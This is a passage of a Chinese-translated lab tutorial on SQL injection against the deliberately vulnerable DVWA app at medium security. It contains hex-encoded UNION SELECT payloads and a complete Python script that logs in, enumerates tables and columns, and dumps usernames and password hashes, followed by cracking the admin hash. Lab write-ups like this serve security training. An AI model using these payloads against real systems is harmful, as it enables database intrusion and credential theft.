name.encode('utf-8').hex()</span></pre><p id="9c3e" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">有了这两行简单的代码，我们就有了一个包含十六进制表示“john”的变量。我们还必须记住，MySQL需要“0x”前缀，所以我们需要手动添加它！</p><h1 id="3a56" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">获取表格信息</h1><p id="ac22" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">在这一步中，我们希望获得有关感兴趣的表及其列的信息。</p><p id="4bff" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">给我们提供结果的查询如下:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="8ee0" class="nb kc it mx b gy nc nd l ne nf">-1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa';</span></pre><p id="51f6" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">我们有两个问题:</p><ul class=""><li id="0cc9" class="md me it lb b lc ly lg lz lk ng lo nh ls ni lw mi mj mk ml bi translated">引号被转义，这个查询将不起作用</li><li id="a672" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated">脚本必须同时运行，所以在运行脚本之前我们不知道模式名</li></ul><p id="30f2" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">我们可以通过用相应的十六进制表示替换字符串来解决第一个问题，通过使用格式字符串并在运行时插入值来解决第二个问题(然后在我们的脚本中用十六进制表示替换它)。</p><p id="5bca" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">因此，Python查询变量将是这样的:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="8416" class="nb kc it mx b gy nc nd l ne nf">query_tables = "-1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type=0x62617365207461626c65 AND table_schema=0x{}; #"</span></pre><p id="fb72" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">另一个输入必须按照相同的原则检索列名，应该如下所示。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="543e" class="nb kc it mx b gy nc nd l ne nf">-1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'</span></pre><p id="f91f" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">问题是一样的:</p><ul class=""><li id="4026" class="md me it lb b lc ly lg lz lk ng lo nh ls ni lw mi mj mk ml bi translated">我们不应该知道表的名称是“user”</li><li id="41fa" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated">引号被转义</li></ul><p id="244d" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">所以即使是解也和之前的没有什么不同，查询变量是这样的</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="941e" class="nb kc it mx b gy nc nd l ne nf">query_users_cols = "-1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name=0x{} #"</span></pre><p id="b605" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">由于结果将是两个查询的列表，我们希望用户能够从主要的标准输入中选择感兴趣的值。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="e8a7" class="nb kc it mx b gy nc nd l ne nf">table_name = input("Type the table name you want\n")<br/>print("\nThe columns' names in users table are:")<br/>for column in send_query(<br/>    query_users_cols.format(table_name.encode("utf-8").hex()), session<br/>):<br/>    print(beautify_query_single(column))<br/>print ()</span></pre><p id="5564" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">您可以注意到表名是如何用前面解释的Python方法转换成十六进制版本的。</p><h1 id="8d90" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">获取用户名和密码</h1><p id="d208" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">我们已经看到了中等安全级别的DVWA中的SQL注入是如何给初学者带来一些麻烦的。然而，如果你仔细阅读这篇文章，最后一步应该是自然而然的。</p><p id="87ae" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">即使在这种情况下，我们也希望在运行时插入想要显示的列名。<br/>所以查询变量如下:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="ed84" class="nb kc it mx b gy nc nd l ne nf">query_users_names = "-1 UNION SELECT {}, {} FROM users #"</span></pre><p id="9358" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">这是主要的相关部分:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="cf38" class="nb kc it mx b gy nc nd l ne nf">username, password = input(<br/>    "Type username and password column values with comma separator:\n"<br/>).split(",", 1)<br/>print("The users' names and passwords in users table are:")<br/>for user in send_query(<br/>    query_users_names.format(username.strip(), password.strip()), session<br/>):<br/>    print(beautify_query_double(user))</span></pre><p id="f92b" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">该代码要求用户输入用户名和密码列值，并用逗号分隔。然后打印出用户表中的用户名和密码。<br/>列的值来自逗号分隔的输入。</p><h1 id="ec33" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">结论</h1><p id="355a" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">让我们看看完整的代码，然后运行它！</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="f7b1" class="nb kc it mx b gy nc nd l ne nf">import requests<br/>from bs4 import BeautifulSoup</span><span id="0913" class="nb kc it mx b gy nl nd l ne nf"># Cookies for security level<br/>security_levels = ["low", "medium", "high", "impossible"]<br/># URL section<br/>base_ip = "10.10.35.182"<br/>login_url = f"<a class="ae lx" href="http://{base_ip}/login.php" rel="noopener ugc nofollow" target="_blank">http://{base_ip}/login.php</a>"<br/>sqli_url = f"<a class="ae lx" href="http://{base_ip}/vulnerabilities/sqli/" rel="noopener ugc nofollow" target="_blank">http://{base_ip}/vulnerabilities/sqli/</a>"</span><span id="1676" class="nb kc it mx b gy nl nd l ne nf"># Query section<br/>query_version = "-1 UNION SELECT 1, VERSION()#"<br/>query_database = "-1 UNION SELECT 1,DATABASE() #"<br/>query_tables = "-1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type=0x62617365207461626c65 AND table_schema=0x{}; #"<br/>query_users_cols = "-1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name=0x{} #"<br/>query_users_names = "-1 UNION SELECT {}, {} FROM users #"</span><span id="da27" class="nb kc it mx b gy nl nd l ne nf">def send_query(query, session):</span><span id="3126" class="nb kc it mx b gy nl nd l ne nf">data = {"id": query, "Submit": "Submit"}</span><span id="a987" class="nb kc it mx b gy nl nd l ne nf">response = session.post(sqli_url, data=data)<br/>    soup = BeautifulSoup(response.text, "html.parser")</span><span id="dc33" class="nb kc it mx b gy nl nd l ne nf">final_result = soup.find_all("pre")<br/>    return final_result</span><span id="4bab" class="nb kc it mx b gy nl nd l ne nf">def login(url, security):<br/>    s = requests.Session()<br/>    s.cookies.set("security", security_levels[security])<br/>    response = s.get(url)<br/>    soup = BeautifulSoup(response.text, "html.parser")<br/>    user_token = soup.find("input", {"name": "user_token"})</span><span id="e716" class="nb kc it mx b gy nl nd l ne nf">data = {<br/>        "username": "admin",<br/>        "password": "password",<br/>        "Login": "Login",<br/>        "user_token": user_token["value"],<br/>    }<br/>    response = s.post(url, data=data)</span><span id="e098" class="nb kc it mx b gy nl nd l ne nf">return s</span><span id="e965" class="nb kc it mx b gy nl nd l ne nf">def beautify_query_single(query_result):<br/>    beautified_query_result = (<br/>        str(query_result)<br/>        .replace("&lt;br/&gt;", "\n")<br/>        .replace("&lt;pre&gt;", "")<br/>        .replace("&lt;/pre&gt;", "")<br/>    )<br/>    return beautified_query_result.splitlines()[2].split(":")[1].strip()</span><span id="7e3a" class="nb kc it mx b gy nl nd l ne nf">def beautify_query_double(query_result):<br/>    beautified_query_result = (<br/>        str(query_result)<br/>        .replace("&lt;br/&gt;", "\n")<br/>        .replace("&lt;pre&gt;", "")<br/>        .replace("&lt;/pre&gt;", "")<br/>    )<br/>    return (<br/>        beautified_query_result.splitlines()[1].split(":")[1]<br/>        + " "<br/>        + beautified_query_result.splitlines()[2].split(":")[1]<br/>    )</span><span id="209e" class="nb kc it mx b gy nl nd l ne nf">if __name__ == "__main__":</span><span id="129b" class="nb kc it mx b gy nl nd l ne nf">session = login(login_url, 1)<br/>    response = session.get(sqli_url)<br/>    soup = BeautifulSoup(response.text, "html.parser")<br/>    print("The database version is:")<br/>    print(beautify_query_single(send_query(query_version, session)[0]))<br/>    print()<br/>    print("The database name is:")<br/>    db_name = beautify_query_single(send_query(query_database, session)[0])<br/>    print(db_name)<br/>    print()<br/>    print("The tables' names are:")<br/>    for table in send_query(<br/>        query_tables.format(db_name.encode("utf-8").hex()), session<br/>    ):<br/>        print(beautify_query_single(table))<br/>    print()<br/>    table_name = input("Type the table name you want\n")<br/>    print("\nThe columns' names in users table are:")<br/>    for column in send_query(<br/>        query_users_cols.format(table_name.encode("utf-8").hex()), session<br/>    ):<br/>        print(beautify_query_single(column))<br/>    print()<br/>    username, password = input(<br/>        "Type username and password column values with comma separator:\n"<br/>    ).split(",", 1)<br/>    print("The users' names and passwords in users table are:")<br/>    for user in send_query(<br/>        query_users_names.format(username.strip(), password.strip()), session<br/>    ):</span></pre><p id="525f" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">此时，我们可以运行脚本并保留我们需要的所有数据:</p><figure class="ms mt mu mv gt ju gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/4f3b05e0c1fa89a26ab3c80177952700.png" data-original-src="https://miro.medium.com/v2/resize:fit:1126/format:webp/0*3_yC02ghK61ba3yK.jpg"/></div></figure><p id="ef9f" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">和上一关一样，我们需要破解密码。所以让我们再去一次<a class="ae lx" href="https://crackstation.net/" rel="noopener ugc nofollow" target="_blank">破解站</a>，在那里粘贴管理员的密码！</p><figure class="ms mt mu mv gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nk"><img src="../Images/7f615eef6bc26fa20b498b6c558db2da.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*h3n7ZJiTmrZemdKz.jpg"/></div></div></figure><p id="9182" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">现在我们已经发现密码是"<em class="nj">密码</em>"我们可以在中等水平的DVWA机器上完成我们的SQL注入之旅。<br/>我希望你深刻理解我们所做的，我希望你通过测试这个漏洞增加很多乐趣。如果你喜欢，请继续关注我的博客，我很乐意发布这样的内容！<br/>下篇见！</p></div><div class="ab cl no np hx nq" role="separator"><span class="nr bw bk ns nt nu"/><span class="nr bw bk ns nt nu"/><span class="nr bw bk ns nt"/></div><div class="im in io ip iq"><p id="8871" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated"><em class="nj">原载于2022年8月29日https://www.stackzero.net</em><a class="ae lx" href="https://www.stackzero.net/sql-injection-dvwa-medium/" rel="noopener ugc nofollow" target="_blank"><em class="nj"/></a><em class="nj">。</em></p><p id="3d4c" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated"><em class="nj">来自Infosec的报道:Infosec上每天都会出现很多难以跟上的内容。</em> <a class="ae lx" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="lb iu"> <em class="nj">加入我们的每周简讯</em> </strong> </a> <em class="nj">以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</em></p></div></div>    
</body>
</html>